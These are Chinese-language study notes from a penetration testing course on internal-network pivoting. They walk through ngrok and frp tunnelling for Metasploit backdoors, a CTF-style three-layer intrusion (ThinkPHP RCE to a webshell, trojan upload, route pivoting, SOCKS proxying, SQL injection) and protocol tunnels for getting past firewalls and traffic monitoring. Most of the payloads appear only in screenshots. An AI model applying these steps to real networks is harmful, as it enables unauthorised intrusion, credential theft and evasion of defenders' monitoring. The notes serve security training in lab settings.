![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpmaicZiaoZgcmn8ribkeTjB5EsW3O0nABGQF0qgj7c299GANcCN3Os9vYw%2F640%3Fwx_fmt%3Dpng)

出现了一个system,提权成功

点击insert进入终端执行命令

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpMXkxV96xAicOSYLLl0dXVWxPh9ib6ricJSHUd62WMJpyVocjZicDibeIhwQ%2F640%3Fwx_fmt%3Dpng)

可以输入help来查看有那些命令

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpROvl8o97NNkiajyM4gUqQ7TsuJ5Mu7gD1gBLxic4Z7mvRBdt1QnG0YYQ%2F640%3Fwx_fmt%3Dpng)

信息收集

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpBwK9NZvPjbllz39KBvOm9OWr8tUVNjmmgFQ3vuiaGO6iaf0UUNKu9Kgg%2F640%3Fwx_fmt%3Dpng)

探针当前网络环境

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpwPib1iaPJDY2SZLeM1xN4HwPGNj3Yr2RP7P6Qj1gtlgPsEZial69Pufhw%2F640%3Fwx_fmt%3Dpng)

点击view->Targets

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpWP2MWEUbEp2giaJXGhtKiaO1PDzFC3Wc9IhkG7KuhgpbpYGXaIdpYm4A%2F640%3Fwx_fmt%3Dpng)

获得当前域控列表

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpJcIWxYM7iaRialNQHISFib9uia4RZb8IAQgibHZzqiaYTjq03e5jYicDsib4bA%2F640%3Fwx_fmt%3Dpng)

通过mimi获得的密码可以列表化

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp4hzTSbLo7BOiaE3icOt45Wm1arCMzA3Bpm8IXnHh83yAPfVacswGSDng%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpCqXqLGN9le5ib6xnicfyAngDDaT7DZd97Iqy2LYeJNM7rfPqXAIYGnLQ%2F640%3Fwx_fmt%3Dpng)

选中主机来进行攻击

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpIX9dNrxgRVlZlzTOXNFjicdMls1Lm3Dp0wLS5QmSOpq6iaLVwORTROUA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpiaRiaia7A6ficcSwlUCFiaapFVBjMTPCT9vgy48sDCNxjrgLB54ZsQ2Vy9w%2F640%3Fwx_fmt%3Dpng)

尝试连接

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp2G7Mov19eJv8L6aiciae0CpyauF52ia6R9Q2U7mRRKE81u0zkDVQ49fsA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpwConVpMPYjAf2asYhJbSavysn4IQWmDQ9LDFetptbFGYKbdwKCZTqg%2F640%3Fwx_fmt%3Dpng)

代理问题

自主工具

可以上传sadon

* * *

## day70.域横向内网漫游 Socks 代理隧道技术

必要基础知识点:

*   1.内外网简单知识
    
*   2.内网1和内网2通信问题
    

可以用代理解决

*   3.正向反向协议通信连接问题
    

正向:指正方向连接,控制端连接被控制端

反向:指反方向连接,被控制端连接控制端

假如控制端是公网,被控是内网,如果,你直接去找在内网被控的是无法找到的。可以让被控端去找控制端

*   4.内网穿透地理隧道技术说明
    

隧道主要是解决流量分析工具,流量监控工具,防火墙相关过滤

代理主要解决网络连通性问题

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpMQh801jEkSYAt1CyjWibic1nIw3zX3g2GYbQKR7mlaw8biaBm7Lnpbgew%2F640%3Fwx_fmt%3Dpng)

演示案例:

内网穿透Ngrok测试演示-两个内网通讯上线

实验环境:两个不同的内网(有网络)实现穿透控制

1.  注册-购买-填写-确认http://www.ngrok.cc/协议:http 本地端口:192.168.76.132:4444
    
2.  测试:内网1执行后⻔-免费主机处理-内网2监听-内网2接收器
    
    ./sunny clientid id
    

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpvNjSA8CBpevPz761ySCW7aCfIaq1noSKzez2VoJrF6Ioicgujwza7pA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpSEUwgJsNhibp27icYVZGRSADia2dmNZ5LLibSrRCTowqemYSooZGTIkiaog%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp4cicL3W0ibaWLI5jTjXRdicoLvhv5CE5tnrIjzSic4cpG2qmROHgICbbBQ%2F640%3Fwx_fmt%3Dpng)

攻击机是一台kali,在上面下载ngrok并且打开它,clientid为注册后给的id

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpsXZGgonwmiccUFqeLt2jXicJgAC4bdgxuY4UgCjqlw89iaoiauhv1ibGnyA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpyN31FQ1AEJfbaPibv8a4M6VqkFGS4lZyncIU242oOoKAibzib8IzmU7cg%2F640%3Fwx_fmt%3Dpng)

目标机只要访问xioadiisec.free.idcfengye.com就可以连接到攻击机kali

msf生成后⻔

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpershCSmLQsLzVicThJpyyOTpUdr9Fp3SU6dEkb3wH6ljkGSp8Osz2OQ%2F640%3Fwx_fmt%3Dpng)

目标机是win7,将msf的木⻢上传到目标机,在kali上监听

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpdkQolofF5iaJWibJRRMk0D25F9dHwAhmzK8aJkjZ8L7s1gZuyDJRamvg%2F640%3Fwx_fmt%3Dpng)

在win7的目标机上执行后⻔,kali收到会话

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpTKdp7QSUU0Inr0Qk4ibTcXg1klEgsiarvPEBb1MhZpeZkd9Y8QialXiaog%2F640%3Fwx_fmt%3Dpng)

并且在sunny上也看到流量在传递

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpIfQ1BkpgGduUbniblZh5q9j9L7zllq2KljxXsamjOSiaib5CpicLkQszgw%2F640%3Fwx_fmt%3Dpng)

**内网穿透Frp自建跳板测试-两个内网通讯上线**

自行搭建,方便修改,成本低,使用多样化,

1.服务端-下载-解压-修改-启动(阿里云主机记得修改安全组配置出入口)

服务器修改配置文件frps.ini:

\[common\]bind\_port = 6677

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpicmRPzictoHCTMGRtaDA8zOp4xRSMJZibUEselpKhnNqeKfiahxn5Z08Ag%2F640%3Fwx_fmt%3Dpng)

    启动服务端: ./frps-c./frps.ini

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpLVU53Trnm3wBM5suH7fCpKZlLFsukDfdsdicLPYeHeDcILYUth3QDmQ%2F640%3Fwx_fmt%3Dpng)

2.控制端-下载-解压-修改-启动

控制端修改配置文件

    [common]

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJprZN1RYeJhvnEL6IFSQBzSfhrBp2K1kJAJSxzK4Np8knmAcUu9lZjjQ%2F640%3Fwx_fmt%3Dpng)

    启动客户端 ./frpc-c./frpc.ini

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpkjhvMuwa1DvNTWe9KxXxYCibfAvlsHpakdey9GYrib1f5z9lwgcWfaLg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpgIZ7GnoFrHwEs59HPZJ4K04dUibBlMiatApOOpaPtvsjEu8ypqEsQicFQ%2F640%3Fwx_fmt%3Dpng)

MSF生成木马上传到目标机器：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpibqZlMGhR8s18VhicicHtYdtHMSC1WpogasGkqGNn2F642gWAziboRd1icw%2F640%3Fwx_fmt%3Dpng)

MSF器监听：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpYX7OicIIO3kcX7MLWCm9zXkXmSALIETCTyUmkZ39KpmhUK7ibibFL5DPg%2F640%3Fwx_fmt%3Dpng)

**CFS三层内网漫游安全测试演练-某CTF线下2019**

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpRwGicZpKsAItDFBFVB3hYT1PgJicLXde7PpeSvAKh0K6W4Uj8Mg4zJTQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpRCTFJ2kSbcS3yLa5ibf7znrD2KMOa2EKZ6AZwhkqACEUh5ysyEXcnYQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpmx5hfCST8D0gAiaN9CgIlS7tLLSRYWpkK4bgMgyS9QWpo0MAX6Gp4dw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpibrGIj4EYmnoDhAODNhO5n7wkrTwlQdTib3xEqJQyUrgrZz1upiaBbQXw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpdthHUxemBCv6plZFXgfiaHDnqMw9qaPbtxyVp3w1njrxicWKoSASyJsQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpO3YF7lOjZ4LATjYs2xwqRJlDxxHhOy49rgVapouCpib40rCE4xyFzUA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpjFnBkmiaiaTyeZe61LnbxIpicvwkiamGhZ07pEq581NMJqmUE3IBlRaRjw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpEia4aDj3dmasibkVUZfXkCWBMsQ7Oiah6qKgLiawMwtO6cqvux3rmnZ6UQ%2F640%3Fwx_fmt%3Dpng)

开始

第一台主机的192.168.75.148我们可以直接访问,通过端口扫描,得知开启了80端口,访问该端口得到以下内容

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpIiam7qu2z23pI39jgXNYJblm26Azk98tKvjyfu06S55gnqNEc0Abzicw%2F640%3Fwx_fmt%3Dpng)

使用thinkphp的攻击工具-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpdCHVGdkWWKmhrXWzDNqqU7VEEKicsRnz6o41x50of3iahkkVqClIXfmA%2F640%3Fwx_fmt%3Dpng)

得到一个命令执行漏洞,写入webshell在当前目录为2.php

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp4BD5pS5RjMJ8hjf1boficAgZzztCuu9vZgHtAfgaibzyBaDNLfNX9adQ%2F640%3Fwx_fmt%3Dpng)

使用后⻔管理工具进行连接

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpglGyGicaD4a2xKibrnub8bicjgEEEsHLZ4VAPbiarNIEo0jzeN8oufImew%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpG8jia0iciajpJTZdm2qKGcbqouNKNsNPL6bPcia1mckbiaqM6iaiaib5vKvTQw%2F640%3Fwx_fmt%3Dpng)

我们要将它作为一个跳板,使用msf或者CS

现在使用攻击机kali

使用msf生成一个Linux后⻔

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp3c9xOabkZmibpOQjOmmwic2jX5ibTe7E1qcU4zSLkT6HxjaoViaLBrERxQ%2F640%3Fwx_fmt%3Dpng)

msf监听

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpxuQpuFcwIHkLwPjn9PY19K2jKvSwGdgQQnc2dVwqWCuR7fPiazQrxQA%2F640%3Fwx_fmt%3Dpng)

将木⻢通过webshell上传至目标主机,执行

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpmA7RE0Dic51VIQ6VR8mwVeM1dmyZsy4JldE0dT7w85ZwPb7G17H6K7Q%2F640%3Fwx_fmt%3Dpng)

msf接受到会话

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpUYe2sTrsd3IWNvzZvZBA7Micol7C1X8iczEscaJzCVlrConNQoicgCJvw%2F640%3Fwx_fmt%3Dpng)

在msf和cs上有自带的代理

信息收集,获取网卡信息,看是否有内网

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpLHUpg79TjdMNtUJTUXzxzOE4qsvxcibwrPqfHGpkElXDztSxY26qNfA%2F640%3Fwx_fmt%3Dpng)

除了.76外还有一张.22的网卡,现在无法与他连接

查看路由,看是否和他建立路由规则

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpIKVNPCicgu9jKdsyWgc3gGRQfLNO5vicDvnCicHgrJibQqTkA9NnsL7KAQ%2F640%3Fwx_fmt%3Dpng)

当前路由为空,添加路由地址,再次查看路由

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpANkkF7h0KBultWPzb3rOaZFv6WwOhAHNzPSSAS5sqJOgskovyeeqGQ%2F640%3Fwx_fmt%3Dpng)

现在应该可以和.22进行通信,但只能在msf会话上操作,无法攻击。我们可以使用msf在本地开启代理

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpSCEX9kztZj9QaO1ZY3xP0VVEl7ymnicVmCaMQYqGsxGmBMxWjUAg6jA%2F640%3Fwx_fmt%3Dpng)

这里应该是设置的srvport

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp1cRETkdNOfFcAAmyk3AlwBzHmIgq8RIRqgTzHAOKh43jKYF33Oh49g%2F640%3Fwx_fmt%3Dpng)

开始利用代理端口扫描

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpntCRxoNwba1eNLAjBMu5iaK2bRoVUTws3DJhsDYkof1dozyK4MBSrVw%2F640%3Fwx_fmt%3Dpng)

扫到.22.128的80端口,直接用浏览器无法打开,配置浏览器代理,直接选择Socks v4.

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpZ44t6HgJTNSYTlK7sGLtw5Ollf0aRfMhMXmLVic3EicNbE4lYEPS5iaOQ%2F640%3Fwx_fmt%3Dpng)

可以访问

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpIy9K29VYlxtbjQEHjszYXUnCiaKTBgsrxvRVfuyyOAeeowNOyXR1mtw%2F640%3Fwx_fmt%3Dpng)

源码中告诉漏洞在哪

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJprgBhoEpya2F66bvibDwSSGj5WEsJStIxFpRNEudiaUbtyibTUcB2mvibDA%2F640%3Fwx_fmt%3Dpng)

进行SQL注入得到密码账户

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpssBkNO9PibjbFE6ibtkiaoNuzKOaPNQ0WAanCv0DAJsqicBias7iatRLldLw%2F640%3Fwx_fmt%3Dpng)

通过robots.txt得到登录地址,登录后台

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpZO8Caw52tM64aDoVoqdAwDB9wRQyguKB8ZicuGqSMTbVSIn8qAyia4YA%2F640%3Fwx_fmt%3Dpng)

可以通过后台功能得到webshell,可以往里面写websehll

观察网站url查找规律

用工具连接后⻔。这里推荐蚁剑,可以设置代理

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpvCz2tyeQh8qIrhS12G1hcLGegCWdylzCSgu0tDjlEkeD5mYGz2xB2Q%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJplKiaWGv8ENvUWwQ7ymAh4KyPAjvCvIOuPficmSwOtXl5P8gOHjM7HO7Q%2F640%3Fwx_fmt%3Dpng)

也可以使用Proxifier全局代理工具,

还有SocksCap64进程代理工具。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpLyc9w6RAg42ia8eba6GOKgial94XKSmt1e4y2uHkjSNY4QUpowRhjKuQ%2F640%3Fwx_fmt%3Dpng)

加载代理,然后再将webshell管理工具在代理隧道中允许

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpzaN9ibdTGqh7iceDiaCVozyT8bb4yPwy4icOqcz01sZVDVMGHmERv7QmWA%2F640%3Fwx_fmt%3Dpng)

使用msf生成正向后⻔绑定本机3333端口,然后再去寻找目标机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpcQsh6ZJWjuHGeMtN42MWsuShMrgRHibxGKGVcvibHLALO40zSqWDGkYw%2F640%3Fwx_fmt%3Dpng)

将木⻢通过websell上传至目标主机,msf监听

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpupJT03CRoibg1866HKSibESb0DyvtOL1mxxzia8uTiaibiaX6svr7UeGFeTA%2F640%3Fwx_fmt%3Dpng)

目标机执行木⻢,msf上线

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpTGGQEttThIpC2l0cb4M3ibUXHWcqlv2J0sjiaD5wGqOqRguArzZ67tiaw%2F640%3Fwx_fmt%3Dpng)

得到网络环境,添加路由

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpLnwpLBPq1mJUXe6cBY62bAMAU2JV0HxuWMxyQVNqdjUHlsVBtleJqQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpAWRNEpz9Mr37kG3iaHEERia85kic6gMFymUv6ncvibJiax8Oic9ofAdOufWw%2F640%3Fwx_fmt%3Dpng)

重复之前的操作 ，使用nmap -script=all扫描漏洞

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp1nzvu3ttZSI1icgQUxD9md58Gq7hsLWZvKkgRIGhskSHHCKyNj6jUlA%2F640%3Fwx_fmt%3Dpng)

* * *

本系列的教程将会定期更新，麻烦点个关注吧。

[查看原网页: mp.weixin.qq.com](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484247&idx=1&sn=abc131479e3df8a5389f97452d5e0241&chksm=cfd87ca8f8aff5be206c7f90aaef732828abafc98d840f90f9b31ba8e123cf3cc8091ea27cd2&mpshare=1&scene=1&srcid=0804fO93XBsTnGpDK6jNKxLr&sharer_sharetime=1659545527719&sharer_shareid=c75c93b84e50ea6bcab5077411998942#rd)

# XD安全渗透测试课 学习笔记 | 内网渗透(四)



* * *

## Day71.域横向网络 & 传输 & 应用层隧道技术

必备知识点:

1.代理和隧道技术区别?

代理主要是解决访问问题

2.隧道技术为了解决什么?

3.隧道技术前期的必备条件?

已经获得一定的控制权,但是不能对控制的东⻄进行信息收集或执行它上面的东⻄在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截CS、MSF无法上线,数据传输不稳定无回显,出口数据被监控,网络通信存在问题等.

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3hsPxjONoz2iajEjbWe8CLrFa3FEdUNibPWHjSyCEZuutytbF0ah4uUWQ%2F640%3Fwx_fmt%3Dpng)

常用的隧道技术有以下三种:

*   网络层:IPV6隧道、ICMP隧道
    
*   传输层:TCP、UDP、端口转发
    
*   应用层:SSH、HTTP/S隧道、DNS隧道
    

实验环境：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3YopJrxCo1QDQxYH4eTIXzcmx1owx44Y6Vic7xuw2n70BfQv3btNaZ2w%2F640%3Fwx_fmt%3Dpng)

网络传输应用层检测连接通信-检测

1.TCP协议

用瑞士军刀-netcat

执行nc命令:nc ip port

2.HTTP协议

用“curl”工具,执行curl IP：port 命令。如果远程主机开启了相应的端口,且内网可连接外网的话,就会输出相应的端口信息

3.ICMP协议


```
用"ping"命令,执行ping  ip\域名 
```


4.DNS协议

检测DNS连通性常用的命令是"nslookup"和"dig"

nslookup是Windows自带的DNS探测命令

dig是Linux系统自带的DNS探测命令

### 案例2-网络层ICMP隧道ptunnel(老工具,可以使用新的)使用-检测,利用)

kali-Target2-Target3

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3LSoezrNqdgfr7LibloLQaWKLFRex4iaA5HH2Rv7JnQ8c4knbCWa4q7uQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd34ZQ1Ribd1m3sqbAOlkicmHSIOb1KZCDUUkONlQESUg7pBAq458m1waicQ%2F640%3Fwx_fmt%3Dpng)

前期要将工具上传至Target2，在webserver上允许程序运行

